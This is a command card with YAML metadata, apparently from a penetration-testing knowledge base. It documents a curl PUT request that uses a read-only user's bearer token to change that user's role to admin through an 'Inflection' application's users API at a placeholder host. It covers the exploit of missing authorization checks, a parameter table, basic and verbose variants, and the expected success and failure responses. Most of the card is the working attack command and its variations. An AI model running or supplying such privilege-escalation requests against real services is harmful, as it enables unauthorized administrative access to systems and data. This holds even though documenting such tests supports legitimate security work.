---
id: cmd-uuid-456
data: >-
  curl -X PUT -H "Authorization: Bearer YOUR_READ_ONLY_TOKEN" -H "Content-Type:
  application/json" -d '{"role": "admin"}'
  https://inflection.example.com/api/users/YOUR_USER_ID
tags:
  - api-testing
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.589Z'
verified: false
validated: true
submitted: true
---
# curl-put-privilege-escalation

## Command

```bash
curl -X PUT -H "Authorization: Bearer YOUR_READ_ONLY_TOKEN" -H "Content-Type: application/json" -d '{"role": "admin"}' https://inflection.example.com/api/users/YOUR_USER_ID
```

## Description

This curl command performs a PUT request to the Inflection application's users API endpoint to escalate a user's privileges from read-only to admin by updating the role in the JSON payload. It bypasses UI restrictions by directly targeting the backend API, exploiting insufficient authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP PUT method for updating resources | Yes |
| `-H "Authorization: Bearer YOUR_READ_ONLY_TOKEN"` | Provides the authentication token from a read-only user session | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format to JSON | Yes |
| `-d '{"role": "admin"}'` | JSON payload defining the privilege change | Yes |
| `https://inflection.example.com/api/users/YOUR_USER_ID` | Target API URL with the user ID to modify | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -d '{"role": "admin"}' https://inflection.example.com/api/users/123
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X PUT -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -d '{"role": "admin", "permissions": ["full_access"] }' https://inflection.example.com/api/users/123
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON confirming the update, such as {"id": 123, "role": "admin", "updated_at": "2023-10-01T00:00:00Z"}. Failure may return 403 Forbidden if authorization is enforced, or 401 Unauthorized for invalid tokens.

## Related

- [[Related Procedure: Bypass-UI-Restrictions-and-Escalate-Privileges-via-Inflection-API]]
